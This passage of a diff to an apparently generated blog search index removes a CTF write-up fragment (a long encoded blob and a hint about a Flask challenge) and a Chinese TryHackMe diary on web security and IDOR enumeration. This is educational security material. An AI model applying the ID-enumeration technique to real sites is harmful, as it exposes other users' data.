kTWI0WV4jSC9wQ1NnRSgrOz8xSU9lYTQpLzshR3FzOnA8QzoyNThQYFc5NUFqXmQ3UCZJMjxHYiRAM2I7NiRCLUFzJS41LHAyPEBVbVU1JExwJDBOMjdwPlY5OFgtPUwrNTNfISJgMWZRLyY+Vjk+NC46NigxM187JVEuNlVwXjk1JTZxLjhPLyIzXmNEV0JMSC9gQGsoZXFFJFxMWTVASSY9LW4tV1E1XSdoNzRFIjUjODFbWHA1VHFkLjc5O2ohNSM+Nls3Nk4+QkA2bFA7M18hLjM8XjopMjlPO0Y1QDZcJSlCT2soXzYkUDImNTwwdWQtPVNmUTNcRmM3LjVyazc3cXM+ZzQrL2g8MC8kNEIuIW84XTVYP10zNSNqPFwxaFQ8UC42J1hANVhBWEg0KGc4azdRK1VEREJpSVg1J0xeRDJjRWRTPkIhbW4uISUoajVYOSgiNXQ+P2g3OCVQUzxFISpaOFBfSCJBbmllazc2PkVDPGApN3Q0JVhRaDBOKTFdLDtFRys8YChKJzRZSipiMUkzbEgsQyFIcjREOElrM15kXiszXGlCXzpqJCYqPEBfOTIzYjpmYC45QTJzREdPSlcuN2NjXDVAJDxSQkxqajQ1WXRVITY3IjYyNSdeJGY1VHFoLzU/VjwsRGE+W1o4MUhdQDUkOWFVOS9BdEY2VEouSTc2NVFfQDZaQVQ1Qz9bVDVBYTF1NTxXZEA8QFRZKUBWU2RnLm5NclU1JzhTLDppXDBGM106MicuNXM3WzU/cDwyNCcqcSJAVmVxWS5UQj1pNSdVZyM/P0BuZy9qPS9TNVVuSHM0YGo0bDxAJ0BUN1ErLldEQldhQzVYZTN1NChfUGo3Nk9wRS5ybldnMUk1ODc0KDtfbkYnTlc9PEM5WXM0XSxySDVBam1dOTRobTw8YW5ANjQ+J1FEQXBkbGk1VHRBOjxfbFYmNTxyKy4vUy9DMz5WOThYLTl0WyY1VUBcITFpaz9FPlYnYm0uOUJNKTQ9akJILjo0YFIyKiMsQS42aDhuNVRxaDBCTTJZZ0BrKHFjRENcXl01QElLOTV0Mz4yNV0nX0Y8QVI/ITgxW1hwNVY2NVQ1Qz9kRTxeOitCNzYzTVE/P2UsOzNjVDBgPF08b2k5ZDtfdUYnMTFcQk1WVy48XyxHJzUnXkMpOmlmcWczXTo+OTVBIV06NVVJZHE0JyxtNjxfPzgvLiEmcEA4UFVSSTV1VEJsMU8pPCE1VWZNZDRdNVc0NChnNmNAU3BUMzthRmk8NVg4W0UyY1g/OTpmcHBZLXJPPyExM20vKzV0Pj9nRigmQXU8Qzl0SThQZ145QXBlL1U3Nj0rKUQtb1xENCVYUXBBcGRsWCw6UUpWPGApN3A0WjVldTJEP3QwLEItayc1OiVeWTNfMy5FM2AlUE86ajYyLDxBUk4+MWhLNlc/UjdFXjk0aENNLjhPODY1W3VpWj9TRjAtNUInYj9FJGQxYTVUcyNlNUNHIlU8XWpdITY2cEFxODFIX0o1JVFCXDVCcUghPGRAXDc4MUdvZEA3O2VaNzlOWVE1Ql49PTZvSj9yPEBUWSlCS29SLC45S0FtNSc4Uyw6aW48RkYmNjBsLXJOJnU1P3FvJjQnKm48MWhmPyouISVtbDUnTGEiPz9ScWcvajtbNTxdRGciNF0+XTU3WEhncDNcRl9eREJXPTA1J0w9OkFwbXUxL3BDU2I8RSFGMjFGLG1dNXNKVWdHcmU8PzxDOjsmODFJbmdBbmtVWDc5YUorPGFuSSczW0BYOEFwZGxYLjhhX048QFVtWDVcPG9BME1zTkA+QUBJaDRZb0JHN3FiZToxaWNrcj5WOW5vLjo2KDE1VVM5NS45ZUhOMiojLEEuN1tTazVUcyQ8QkwjbFxAayhxY0UkXExPNUBJR081dDM+Mjc8RGpDNj1pYlA4MVFjMTY+XEEoNUJwSVg1Iz42cjc2PjQsQDZsUFw1VTpAbjxeOXQ5OU87RjVDZlhoS0JLJm4yLjlKdTg1PFc3UzBtUXRcOmZMT2kuNXMmITdxcz5nNCsvZUk8Xz84LS42aC0iNiJfS1o1dWZXXy44TkgtLjYnWEA1J1VkQTQoXjBiQFNwSyY7YUUtLTVYOFgnMmNPOTc+QiFuWj1FQGJyMTNtL0w1dD4/aD5DKDNDPEM5dF84UGdeOUJMUUp1NzY8bkc8YW5JMDQlWFFoME4pMW4sO0VJZTxAZmFaNVw8TVMwTidgST5WXU4iNSQ7X0w1VTk2JzNcaUYxOmlmbyo8QF8tdTFJNE4xLjlBKi05NSVPTC43Y2NgM0Y9Z1M1dHRXWjVZdFR1RSRkMWM1QCUvSzVDRyJVNUFGTFFEYT5bWjgxSF1INSVJbkk3OTxlPzZTVyJUODFBW1FANylZWDVZYjZPNUFqYjU0QUtaTjxAVFkpQktvUiwuOUtBbTUnOFBWLT04QV8zXUxGcC5XJUJzNT9xbyY0WXAyLkBWUzpXLjZnXXM1J1NBYDVDInRNL2o9L1M1QSI0VzRgajRsNXNbNG1AU3AkOi05ImgmNVhlNDAuV0pyRy9vK2BbPER0RDYxSTViazQoOzh1RicqPzs8Qzo7JDQ9amNdQW8oYVo3OWFKKkQuYlBMNEUiLDZCLUFzNzU7Uk9LPGAqJ1I1JExzIi9TLVZRPkFARD4tPUwiRzFGLGprMWlrP0VCTD9aOy44TnIhNVVTOTUuOUEwOjIqIyxBLjdbU2s1VHMkPEQwZk1GQGsocWE8QF8nQjVAJXU8NXQ1MDk1XSdfSjVzSidwODFBN141VjY1VTVDLFw+NSJLKlE4MT9XQz9AIjRLM2NUMGI1QG1gLDZvSSwrPEBCUC1CTGMpYTxfLERyNTxXN1MwbVA2RjNeLVk9LjV0JUk3cUZlSzQnKyRsPGAyaDMuIW82JjUnU0FoNSNqM2sxaGZsW0RDZSskNiJhT000KFUqYUBUY1lhO2FFLS41J0xAJTJEQVZnPkIhblo9RUBicDEzbS9MNVY2RE03OCQhcTxITU9tND4vIWBCS11vbTc2PWdiRC1dc100JVdfKTJDTWo5LDpRbCM8YCk3ZzRaNjJCME4nYEwsQyFGLzU6JV5ZM18zLkU2P3Q7KzppQlpVLjhOaS4xaEs2Vz9SL11LRiQ8ZkwuN1tmVjVYSU09NVcoOE41WXRUdTREL0pUNVhKQEE1VHFqOjc8RGpINXNLMTY3cU9rODUlSi86OmkvVTA2U1ZTMTgxSSwjQDcpWVg3OU5ZUTVBIjIpNm9KP3I8QEJSZzc5KkFNLjlLQW01JzhWKjppbjxGNzhJMzQuNXM3WjdxSEVyNFoiZj4xaGY/Ki1yTlFLNSdVZyM/P0BuVy9qTl9vNUB1VFA1J15LXDVzZDpdM1xGPEQtOSM0UTVDK1lIMkRKTW8vcENTZ0UoK00kNVRzSzo1c0pbMkdxczpwPEM5dEg1J15GWDVzZDRhN1AmN048R1BCVjQlV0BeQi1BcyUuNSsmOTxAZ09GNTxyK18vUyYuKT5BUkxvLT1LMl43cWJlOjFpY2tyOmlUY2c8X3VkTzVVUzcrNVUucS0yKiNBSy43W2hyM15ja1lEMEI1QkBrKE0+NiRRZ0o1QCYldDQpJDBPNzxEYVI2Nm9RMTgxUWMxNVRxZG83OSpXOzVwb3RgNzY+NCtCTEZMRTNfIS4zNUBtVzk5TztGNUNmWGVFQFNwKkY8XyxoOTU8MHVUMG1QSnVCTGMvc0RDXD1DN3FzPlY0JypuPT5VV0toLjV0QDY1WEApQTUjWDBaMU8pRGFEQ10kSzU8VV9KNCheMGJAbVhObTtgSVpzNVg4VUEyREpcZz5CIW1zRCdncmExM20vTDVyQ01HPkMmWWE8RSEqbzhvbUtpQkwiMHAvbm1eXjxgKTd0NCVWcTkwTT0qKCw7RTVIPGAoSjY1JExORjBOKUEmLEJSLis1VTEjKjNeZFwuNj90NDM6aiQmKjxfdXQ4MkQ3UiI/Ujc/UURHT0pYLjdbaSE1PFYmNzV0dFdaNVtkZjFFJGQxYzVAJS9LNVRxaC81P2g+UERhN2BNN3FPaSY1JUluSTc5PGU/NlNXIlQ4cCMySUA3KVlYNzlOWVE1QG1WbTRBS1dQQDZIOEhCS29XTC45S0FoNSc4Vio6aW48SDNdOjVNLjxtakM1P3A8MjUkMW9UQFZBLlUuNmdgVTUnVHQ5Pz9Abmcvak5fbzxgaCVvNGBqNGw3WEhqRjdRKy5XO2BJWlQ1WGUzdTVzbl5eMC5VPHFFKCtEMTFJIzVLNXNKaiwxaDFHWzxFIUY0ND4nb19BbmthKzVUc2lARC1nWGQ0PidKYDBOMjdOLjhQNDc8YCE0PDUkTHJWL1MtVlE+Vjk4WC06JnFrN3FiZUoxaWNrckYnPEhUPD9rTCE1VVNaRy42VXMzNVl1L20uOE8uczVYSStrRDBJWy41WDhzUzY2b1EqNUAldTw1dDUwKjVcalw1NjZvOFgxNDNlRjVWNjVVNUMtVVk1cHAraTc2M09zQDZsTGozY1MxXkQubWM5M0JxNFhDZlc4OEJMYyRCPF8saEk1PFc3Uy1uLXVvM18hNEUuNXNqYDVYbSY8NFlwQ2o8Xz86XTxJQG5SN1VJSFc1I1gnaTFoZmxbRENdJEs2ImFPTTQoOW1dN1ErSW07YElUPjVYOFslMkRKXGg+QiFxPy1yTz8hMTNtL0w1dD4/aDc4JCFxPEZmPCw4UGFJc0JNYDgrNzY9Z2JELV1zXTQlWDBGME4pMV0sO0VHKzxgKTdfNFo2MkI0KS1UbyxCLWsnLTl1RHQzXyooRDRbMWJnPF8/WFo8X3VkczFoQjBWP1I3RklER09KVzxgKTdjNVt1aVlCLzs1OTVYOEllNEQtaiU1VHMkMC44RXI+NT9WPCxEYTgsZTE0PGtHNSVKLzo5L0F0Rj0maVs3NzY1MDVANmxNVjAuVSdiNUBtVm00QUtRcDxAZmUrQktvV0w1ViNXVzUnOFQsRidDQERCSzlAQS41czdbNVhtJUg0WiJjWEBWVGRZLjVzYjE1J1VnI0A4SlhQL2pOYFU1QHVXOTRdPl01NChMJD4zXEY/KDREJWw5NUMrWUg1c25eTS9vdDtjRSgrJlsxNDxNMzQpLzshR3JCUnI8Qzo7PDQ+J29fQktlKC83OWFSbTxHYi0xND4nUURBcGxAKy42MTQxPEBnT0I1PHIrby9TJFJtLEJAIUY0RSlUWzdxYmUpNj90N1lCTD9cbDxfdWROM187RmMuOWVITjIqI0o9LjlCdC01VHJSOkRCVz1DQGsoTT42JFFnSDVASSlsNXQzPjI1XSdfRjY2b1ExODFRYzEyQ0w0LDVCcElXNXBvdSE3Nj40LEA2bFMhNVR0LmtELlpdaTlPOWVbQ2ZYaGksQV4+IjYkUUMhNTwwdUQwbVBCLjNJNGRpLjVzST03cUZlVzQnLGA3PlVXS2guIW84XTc2M09nNSNYMFoxTylEYURCVmgtNF0/SyM0KEwkXzVaaD8mO2BJVD41WDhSRzJjTzk3PkIhcUREJ2lQOjEzbS9MNXQ+RTQvcFRnNDxBUmlPOFBgNWZCTFFKdS9ub0VDRC1vXE40PicsdDJEQUUjNTxXJXA8QGZhWjVcPE1TL1MkUl0sQmQ6LTVVMStxM2IydEs0WzFUNTppZm8oPF91dDgxaEIwVjVWPWNHREdhVlouN2NqMTNeYyM5NVcoNWg1WXRXWjY2cEFsNF0sKj01Q0hnYzU/aD5QRGE3YEM4MUhdQDUkMjwuNUJvUEA9JmlbNzRdNkUiQDZINVI3OU5ZUTVCXklBNTxXW2I8QFRZKUJLb0k6Lm5XVF01JzhTJ0ZYOFh0M106Om4uOUFfWzU/cDwyNEZKX0lAVlM6Vy42Z15FNSdUdDlAOEpbRi9qPTIzNVVuSTM0YGpwdDJDXkBuM14tam5DMWdoIzVYSmRhNXNuXl4vb3Q7Y0QrNk5VMUk1QU01c0pkX0YmWyc3PEM5a1Y0PWplYDVBal5kN1AmN1U1QC1XcDQ+J3FiQXBsQCsuOFAxUjxAZmFSNVw8bkUvUyRSbEJMUTAvPEFSYEg3cWJlSjY/dDdZMC5VcnE8QF8nKTQ9akJILjllSzMuTnJNKDxfLUZENVRyNkxEMElbL0BrKGVvNiRRQyo1VHNpVjV0NTAqNVxqXDU0RSFxRjgxQTdeNSQ5YGk1QyxcPjU6cEQ+N1VCZVBANmxNNTNjUzFeRC5tYzQ5TzllW0A2bjNGQk1WVEouN1p1YTUnOCw6MG1QNkYzXj9uKzxdRUtVODE/WWU0JyxXRTxfP1lHPElAXmk2Il9LWjUjWCdpL2o7Wy5EQ1tGcjVYQV8oNXNSLEJAbVhObTtgSVpsNSdMNycyREpcaC9vT3M6LXJPPnQxM20vKzVyQ0gnNzowcSw8RSEzTDhQYUlzQktdb203Nj5VLEREWGFaNCVYMEYwTikxXSw6UWwjPEBmX0w0WjVldTFJM2xILFZFOzs1VTErbTNfKihENFsxVm86aTBLIjxBUmk5MWhLNlcuOUE7Vi5OciM7LjhPODY1WElxVi46UVU9NVtkZjI0RC44QTVVQW9XNUNIVS41QUZNPURhNm9cODFIXGw1JDlhVTFncmRYPSZpWzc4cCMyUUA3aTEkMWhCZjo1QWpiNTNGP0gpPEBWOTosQV4+Ii44Ti9YNSc4VCxGJ0M3YDc4SS9xLjlBTic3cUZiXTUiNyMuMWhnaSstWjJGZjUnTGEiNXVmVUUvak5HcTxgaCg6NF0+XTU3WEhqVjNcRjxDQzFnais1WEpkYTRZZVdHL3BDU2dFKCtEMjVDK1xCNXQ+MG9HcXM6dS1waD9aND4nb19BbyhYaTc5YVtgPEdiJEA0XT45akFwW2ZXLDpSKSE8QGZhUzU8citfME11K24+Vjk7RzRZcDpyMUYjZUYxaWNrckJMP1xsPGBpSG4zXztGYzVVbkY0MioiZWUuOFc8RDVUclI6RDBCNT8sWGJjYDYkUWdDNUBJKWw2bz9IJDc8RGpDNj1pa0I4MVFjMTV0PFNCNVRyTDs1OnAvRDc2PFNSQDZsUFw1VTpAbjxeOitCOU87RjU8QEQuJCxBXj4iNiRQMiY1PFc3ZC09U2ZRM14tWT0uNXNqXzgxQTdRNCcsV0U8YDJoNy4hbmw7NiJfS1o1dWZXXzFPKURfRENbRnI1WEFYRDQoXjBiQG1YVFREQlZoQjVYSmFkMmNFZFM3NnQ5VEQnaVA6MTNrUXM1dD4/aC9wVkBqPEUhKm84UGdeOkZYOGJgL25vRUM8YW5JMDQlVnFBQXBkbEgsO0U1SDtgWk5qNVwiT10xSTNgTT5WS0F1NVUxK201VTk2JzRbMVZvOmokKVsuOE8vKjNiTC9vP1JbVG9ER09KWTxfNVY1NVt1aV41Vyg1aDU9Sl4oNjZwQWw1WEpAMTVDP08tNUFGTT1EYTZvUjgxSF1INSQyPC45L0F0RjZTVyJUOHAjMlFANylZWDc5TmJDNUFhMXE0QUtaTjxBI3EtQktvRWgubk4+ZDUnOFMnRidDN1MzXUxGcC5rcyVSNT9wPDI1IjclaUBWQS5VLiEmcCk1J1R0OT9SbWpAMWUoZSY1VW5IajRgajRsN1hIajdAVGQiXERDW3B1NVhlM3UuV0pOZDc2dDNIRStVVWQxSSMsNTQoO19uR3JmayM8Qzo7JDRdPlgpNUFqWUQ3UCY3UjxhbkknNCVXPWAwTikxTS44UDFRPGAhNDw1PHIuTC9TJi4pPlY5O0c0WW5UVzdxYmReMWljblg+VidlSjw/a0whNVVTWkcuOWVLMzIqIyxBLjhPLyIzYjpFNURDSm06NVg4WGI2Nm9RKjVAJXU8NUNHIlc1XSdoNzUlLi84ODFIXTA1dDxTQTVDLVVaNTpwO0w3VUJlUD9AIjdxM2NULmZELlpdbzNGP0sjQ2ZYamZCTGMnJjxfLEcnNSNgZG4wbVBKdTNeP24rPF1FS1U3cXM+ZzQnKzdcPGAyaDcuISZwQDYiX0taNSNYJ2kxTyk7b0RDW0ZyM0JnXDo0KFUqYUBtWEtGO2FGaTU1WDhbRTJjWD84PkIhaE0tck1qODEzbS8rNXQ+P2kuN1w7MzxFITNLOFBhSXRGWDFOYTc2PWdiPGFuSHA0JVc9ZEA2LlwyLDw4ZVA9QSg4KzRaNWV1MUkzYFAsQXBfJTU6JiIxM18zLkE0WzFWbzpocz51PEFSTj4xaEIwWjVVbktDREdhVlo8YCE0NzVYSXQ7NVZ1YkA1W2RmMUUkXExVNUAmJWQuOEQ/ZTVBRk09RGE2b1I4MUhdSDUlUUJcM14sckVFQUNOYDhwIzJRQDcpW3I1VTpAbjVAJVEkNEFLUXA8QFRZODVCcDc8Lm5NclU1PFc+I0YnQ0BFM11MPikuOUFOJjVYbSVINCcqbjxAVlRkWS48bj9yNVg4NFg/Um1qLy9qTjxTNVVuS0M0XT1tSzdYSGdwM1xGX15DMWdpcjUnTD0/Nj5LbWAvb3Q7VS1yT1NZOWQ7RHA1c0pqK0dxcWE1PEM6KDk0PidvX0Fua2ErN1AmN1I8YW5JJzRFIi8wMkNMN1AuOFA0NzxAaD8sNTxyLjwvUyYuKUYkKllXLT1LMl03cWJnYDNfcyRVQkw/Kjc8YGlIbTVVUzk1LjllSE41O1FNYS44VzxANVRyUjpEQlc9Q0BrKFYwNjZvUSo1QCYldDQpJFdNLXQtRmg2PWliUjgxSj1fNXQ8U0E1Qy1VWjUjPjY2NzY+NCxANmxQXDVVOkBwLjZmTSg5TzllXy5XU2clQkxjJEJEZz1OZzU8V15xMG1QSnUzXyE0RS41cyYhNVhtJis0JyxaODAvJDRALiEmXVU2Il9LRTUjWDBaLXQsTG41QSI0VzRgaT5GLjclNWwzRThbJA==</span><br></pre></td></tr></table></figure>
-<p>最终得到的提示是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你所上传的即是命令</span><br></pre></td></tr></table></figure>
-<p>看了一眼框架，python的flask，直接读环境</p>
-<p><img src="https://s2.loli.net/2024/02/21/n2jT4w5N6gbPhtx.png" alt=""></p>
-<p>乐（</p>
-]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>NSSCTF Round</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CTFshow-文件包含</title>
     <url>/2024/01/19/CTFshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
     <content><![CDATA[<h1>CTFshow-文件包含</h1>
@@ -2188,34 +2176,49 @@ FFI是PHP中调用C代码的手段
       </tags>
   </entry>
   <entry>
-    <title>Tryhackme_Diary-2</title>
-    <url>/2024/02/22/Tryhackme_Diary-2/</url>
-    <content><![CDATA[<h1>Tryhackme_Diary-2</h1>
-<h2 id="Introduction-to-Offensive-Security">Introduction to Offensive Security</h2>
-<h3 id="Web-Application-Security">Web Application Security</h3>
-<h4 id="Introduction">Introduction</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">每个人都在自己的计算机上使用不同的程序。一般来说，程序在我们的计算机上运行，利用我们计算机的处理能力和存储空间。而且，要使用一个程序，我们需要先安装它。但是如果我们可以在不安装的情况下使用任何程序呢？</span><br><span class="line"></span><br><span class="line">网络应用就像一个“程序”，只要我们有现代标准的网络浏览器，比如Firefox、Safari或Chrome，我们就可以使用它。因此，与其安装每个你需要的程序，你只需要浏览相关的页面。以下是一些网络应用的例子：</span><br><span class="line"></span><br><span class="line">- 网络邮件，比如Tutanota、Protonmail、Outlook和Gmail</span><br><span class="line">- 在线办公套件，如Microsoft Office 365（Word、Excel和PowerPoint）、Google Drive（Docs、Sheets和Slides）和Zoho Office（Writer、Sheet和Show）</span><br><span class="line">- 网上购物，如Amazon.com、AliExpress和Etsy</span><br><span class="line">成千上万的其他例子提供了各种各样的服务。其他例子包括在线银行业务、货币转账、天气预报和社交媒体。</span><br><span class="line"></span><br><span class="line">网络银行业务网络应用</span><br><span class="line"></span><br><span class="line">网络应用的概念是它是运行在远程服务器上的程序。服务器是指持续运行以“为客户服务”的计算机系统。在这种情况下，服务器将运行一种特定类型的程序，可以通过网络浏览器访问。</span><br><span class="line"></span><br><span class="line">考虑一个在线购物应用程序。网络应用程序将从数据库服务器读取有关产品及其详细信息的数据。数据库用于以有组织的方式存储信息。例如，关于产品、客户和发票的信息。数据库服务器负责许多功能，包括读取、搜索和写入数据库。在线购物网络应用可能需要访问一个以上的数据库，例如：</span><br><span class="line"></span><br><span class="line">- 产品数据库：这个数据库包含产品的详细信息，如名称、图片、规格和价格。</span><br><span class="line">- 客户数据库：它包含与客户相关的所有详细信息，如姓名、地址、电子邮件和电话号码。</span><br><span class="line">- 销售数据库：我们希望在这个数据库中看到每个客户购买了什么以及他们是如何支付的。</span><br><span class="line"></span><br><span class="line">我们已经看到了任何在线购物系统中存储的大量信息。假设攻击者成功地利用了网络应用程序并窃取了客户数据库，这将给公司和其客户带来重大损失。</span><br><span class="line"></span><br><span class="line">下面的图像显示了在在线购物网站上搜索商品的过程。在最简单的版本中，搜索将分为四个步骤：</span><br><span class="line"></span><br><span class="line">- 用户在搜索栏中输入商品名称或相关关键字。网络浏览器将搜索关键字发送到在线购物网络应用程序。</span><br><span class="line">- 网络应用程序查询（搜索）提交的关键字的产品数据库。</span><br><span class="line">- 产品数据库将匹配所提供的关键字的搜索结果返回给网络应用程序。</span><br><span class="line">- 网络应用程序将结果格式化为友好的网页并返回给用户。</span><br><span class="line"></span><br><span class="line">从用户的角度来看，他们只会访问一个优雅的在线商店，所有的技术基础设施都是隐藏的。</span><br><span class="line"></span><br><span class="line">访问网络应用程序时，技术基础设施被隐藏起来</span><br><span class="line"></span><br><span class="line">许多公司提供漏洞赏金计划。漏洞赏金计划允许公司为发现其系统中的安全漏洞（弱点）的任何人提供奖励。主要条件是找到的漏洞必须在漏洞赏金范围和规则内。谷歌、微软和Facebook等公司都有漏洞赏金计划。发现一个漏洞可以让你赚取从几百美元到数万美元不等的奖金，具体取决于漏洞的严重程度，也就是你发现的弱点。</span><br></pre></td></tr></table></figure>
-<h4 id="Web-Application-Security-Risks">Web Application Security Risks</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">假设您想要从一个在线商店购买商品。在这个 Web 应用程序上，您期望能够执行一些特定的功能。最直接的情况下，在线订购可能会按照以下步骤进行：</span><br><span class="line"></span><br><span class="line">1. 在网站上登录。 2. 搜索产品。 3. 将产品添加到购物车中。 4. 指定送货地址。 5. 提供支付详情。</span><br><span class="line"></span><br><span class="line">针对 Web 应用程序的攻击主要有几个常见的类别。考虑以下步骤及相关的攻击。</span><br><span class="line"></span><br><span class="line">在网站上登录：攻击者可以尝试通过尝试许多密码来发现密码。攻击者会使用一个长列表的密码和自动化工具来测试它们与登录页面的匹配情况。</span><br><span class="line"></span><br><span class="line">搜索产品：攻击者可以尝试通过在搜索词中添加特定字符和代码来突破系统。攻击者的目标是使目标系统返回它不应该返回的数据或执行它不应该执行的程序。</span><br><span class="line"></span><br><span class="line">提供支付详情：攻击者会检查支付详情是否以明文形式发送或使用弱加密。加密是指使数据在不知道密钥或密码的情况下无法读取。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">我们无法涵盖所有内容，但我们将介绍 OWASP 十大的一些正式类别。如果这些技术对您来说听起来有些陌生，请不用担心；TryHackMe 将向您介绍每个漏洞。</span><br><span class="line"></span><br><span class="line">识别和身份验证失败：识别指的是唯一识别用户的能力。而身份验证则指的是证明用户是其所声称的人的能力。在线商店必须在用户使用系统之前确认用户的身份并对其进行身份验证。然而，这一步骤容易受到不同类型的弱点的影响。例如：</span><br><span class="line"></span><br><span class="line">允许攻击者使用暴力破解，即使用自动化工具尝试许多密码以查找有效的登录凭据。</span><br><span class="line"></span><br><span class="line">允许用户选择弱密码。弱密码通常容易被猜到。</span><br><span class="line"></span><br><span class="line">以明文形式存储用户的密码。如果攻击者成功读取包含密码的文件，我们不希望他们能够了解存储的密码。</span><br><span class="line"></span><br><span class="line">损坏的访问控制：访问控制确保每个用户只能访问与其角色或工作相关的文件（文档、图像等）。例如，您不希望市场部门的某人访问（阅读）财务部门的文档。与访问控制相关的示例漏洞包括：</span><br><span class="line"></span><br><span class="line">未能应用最小权限原则，并给予用户比他们需要的更多的访问权限。例如，一个在线客户应该能够查看商品的价格，但他们不应该能够更改商品价格。</span><br><span class="line"></span><br><span class="line">通过使用其唯一标识符查看或修改其他人的帐户。例如，您不希望一个银行客户能够查看另一个客户的交易。</span><br><span class="line"></span><br><span class="line">能够以未经身份验证的用户的身份浏览需要身份验证（登录）的页面。例如，我们不能让任何人在登录前查看网络邮件。</span><br><span class="line"></span><br><span class="line">注入：注入攻击是指 Web 应用程序中的漏洞，其中用户可以将恶意代码作为其输入的一部分插入。此漏洞的一个原因是对用户输入的验证和清理不足。</span><br><span class="line"></span><br><span class="line">密码学失败：这个类别与密码学有关的失败。密码学关注的是数据的加密和解密过程。加密将明文转换为密文，对于没有密钥解密的人来说，密文应该是无法理解的。换句话说，加密确保没有人能够在不知道密钥的情况下读取数据。解密使用密钥将密文转换回原始明文。密码学失败的</span><br><span class="line"></span><br><span class="line">示例包括：</span><br><span class="line"></span><br><span class="line">以明文形式发送敏感数据，例如使用 HTTP 而不是 HTTPS。HTTP 是访问 Web 的协议，而 HTTPS 是 HTTP 的安全版本。其他人可以读取您通过 HTTP 发送的所有内容，但不能读取 HTTPS。</span><br><span class="line"></span><br><span class="line">依赖弱密码算法。一个旧的密码算法是将每个字母向后移动一位。例如，“TRY HACK ME” 变成 “USZ IBDL NF”。这个密码算法很容易被破解。</span><br><span class="line"></span><br><span class="line">对密码学函数使用默认或弱密钥。使用 1234 作为密钥的加密很容易被破解。</span><br><span class="line"></span><br><span class="line">这张图显示了一名顾客在线使用她的信用卡，信用卡号以明文形式发送。</span><br><span class="line"></span><br><span class="line">如果这些技术起初看起来有些复杂或高级，请不用担心。TryHackMe 专门提供了深入的房间，帮助您理解和实验针对 Web 应用程序的各种攻击。</span><br></pre></td></tr></table></figure>
-<h4 id="Practical-Example-of-Web-Application-Security">Practical Example of Web Application Security</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">此任务将调查一个使用不安全的直接对象引用（IDOR）的易受攻击的网站。IDOR属于破坏访问控制的范畴。破坏访问控制意味着攻击者可以访问未针对他们的信息或执行未经授权的操作。考虑这样一个情况，一个 Web 服务器接收用户提供的输入来检索对象（文件、数据、文档），并且它们按顺序编号。假设用户有权限访问名为 IMG_1003.JPG 的照片。我们可能会猜到还有 IMG_1002.JPG 和 IMG_1004.JPG; 但是，即使我们弄清了它的名称，Web 应用程序也不应该提供给我们那张照片。通常，如果对输入数据放置了太多的信任，就会出现IDOR漏洞。换句话说，Web 应用程序不会验证用户是否有权限访问请求的对象。</span><br><span class="line"></span><br><span class="line">仅仅提供用户或产品的正确 URL 并不一定意味着用户应该能够访问该 URL。例如，考虑产品页面 https://store.tryhackme.thm/products/product?id=52。我们可以期望这个 URL 提供有关产品编号 52 的详细信息。在数据库中，项目将按顺序分配编号。攻击者将尝试其他数字，例如 51 或 53，而不是 52; 如果 Web 应用程序容易受到攻击，这可能会显示其他已退休或未发布的产品。</span><br><span class="line"></span><br><span class="line">让我们考虑一个更为关键的例子；URL https://store.tryhackme.thm/customers/user?id=16 将返回 id=16 的用户。同样，我们期望用户具有顺序编号。攻击者将尝试其他数字，并可能访问其他用户帐户。这种漏洞可能适用于顺序文件；例如，如果攻击者看到 007.txt，那么攻击者可能会尝试其他数字，例如 001.txt、006.txt 和 008.txt。同样，如果您是编号为 16 的ID，而编号为 17 的ID是另一个用户，通过将ID更改为 17，您可以看到属于另一个用户的敏感数据。同样，他们可以将ID更改为 16，并查看属于您的敏感数据。（当然，我们在这里假设系统容易受到IDOR攻击。）</span><br><span class="line"></span><br><span class="line">点击“查看站点”，让我们看看它是如何运作的。您将看到一个显示库存管理系统的页面。如果您点击“计划发货”选项卡，您会发现攻击者已经在破坏计划中成功地混淆了事情。请注意，他们将错误的轮胎发送到每条生产线上；例如，他们将摩托车轮胎和摩托车轮胎分配给了自行车装配！如果不加修复，所有轮胎都将错误地发送到错误的装配线。</span><br><span class="line"></span><br><span class="line">我们将黑客系统并撤消攻击者的步骤。在“您的活动”中，您可以看到一个用户的活动。我们有理由相信这个网站有IDOR漏洞。</span><br></pre></td></tr></table></figure>
-<p>这一块就是介绍了一个简单的用户遍历，通过get请求可以直接通过相关编号修改去实现用户遍历，最后还原即得flag</p>
-<p><img src="https://s2.loli.net/2024/02/23/KQwURGOTarhvCYB.png" alt="Tryhackme_2_1"></p>
-<h2 id="Introduction-to-Defensive-Security">Introduction to Defensive Security</h2>
-<h3 id="Intro-to-Digital-Forensics">Intro to Digital Forensics</h3>
-<h4 id="Introduction-To-Digital-Forensics">Introduction To Digital Forensics</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">取证是将科学应用于调查犯罪并确定事实的过程。随着计算机和智能手机等数字系统的使用和普及，涉及数字设备和媒体的调查衍生出了一个新的取证领域：计算机取证，后来演变为数字取证。</span><br><span class="line"></span><br><span class="line">想象以下情景。执法人员到达犯罪现场；然而，这个犯罪现场的一部分包括数字设备和媒体。数字设备包括台式电脑、笔记本电脑、数码相机、音乐播放器和智能手机等。数字媒体包括CD、DVD、USB闪存驱动器和外部存储等。会出现一些问题：</span><br><span class="line"></span><br><span class="line">警方应如何收集数字证据，如智能手机和笔记本电脑？如果计算机和智能手机正在运行，应该遵循什么程序？</span><br><span class="line">如何转移数字证据？在搬运计算机时是否有一定的最佳实践要遵循？</span><br><span class="line">如何分析收集到的数字证据？个人设备存储容量从几十吉字节到数千吉字节不等；如何分析这些数据？</span><br><span class="line"></span><br><span class="line">假设上图中的员工存在嫌疑，我们可以迅速看到可能与调查相关的数字设备。我们注意到一个平板电脑、一个智能手机、一台数码相机和一个USB闪存驱动器，还有一台台式电脑。这些设备中的任何一个都可能包含大量的信息，有助于调查。处理这些作为证据需要进行数字取证。</span><br><span class="line"></span><br><span class="line">更正式地说，数字取证是将计算机科学应用于对数字证据进行法律目的调查的过程。数字取证用于两种类型的调查：</span><br><span class="line"></span><br><span class="line">公共部门调查是由政府和执法机构进行的调查。它们将成为刑事或民事调查的一部分。</span><br><span 